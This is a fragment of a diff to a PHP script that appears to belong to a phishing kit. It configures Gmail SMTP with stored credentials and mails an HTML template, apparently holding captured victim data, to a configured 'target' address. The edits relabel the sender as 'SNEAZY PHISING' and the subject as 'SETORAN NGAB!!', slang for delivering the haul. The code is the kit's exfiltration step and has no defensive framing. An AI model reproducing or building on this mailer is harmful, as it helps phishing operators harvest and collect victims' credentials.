@@ -57,12 +57,12 @@ $email->SMTPSecure = 'tls';
 $email->SMTPAuth = true;
 $email->Username = config('EMAIL_GMAIL');
 $email->Password = config('PASSWORD_GMAIL');
-$email->setFrom(config('EMAIL_GMAIL'), 'IHSAN DEVS');
+$email->setFrom(config('EMAIL_GMAIL'), 'SNEAZY PHISING');
 
 // Set Receiver
 $email->addAddress(config('TARGET_EMAIL'));
 
-$email->Subject = 'PHISING NGAB';
+$email->Subject = 'SETORAN NGAB!!';
 $email->msgHTML($template);
 if (!$email->send()) {
     header('Location: /');
